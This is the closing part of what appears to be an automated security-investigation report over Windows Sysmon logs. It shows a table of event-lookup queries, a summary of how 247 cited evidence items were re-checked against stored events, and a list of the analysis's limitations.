| q-979dcca6ce | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpizF2M"} | None |  |
| q-5c0a44f537 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpgxY85"} | None |  |
| q-7512f92498 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpgxY85"} | None |  |
| q-b136888302 | verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.17-000001", "id": "AaFHon1uOFchItpgxI_4"} | None |  |

## Verification

Evidence items cited: 247; confirmed against the stored events: 244; rejected: 3. Each item was re-fetched with get_event; it is confirmed only if the event exists, the cited field holds the cited value, and the cited query_id is a query of this run that returned that event.
Evidence sent back to the agents for correction during the run: 14 item(s) in 6 submission(s) (one correction round each; what still failed was rejected).

## Limitations

- Findings describe what the stored logs show; activity these sources did not log cannot be seen.
- Datasets with non-overlapping time windows (see Data examined) were analysed separately.
- Long field values are shortened in this report; full events are retrievable by _index/_id.
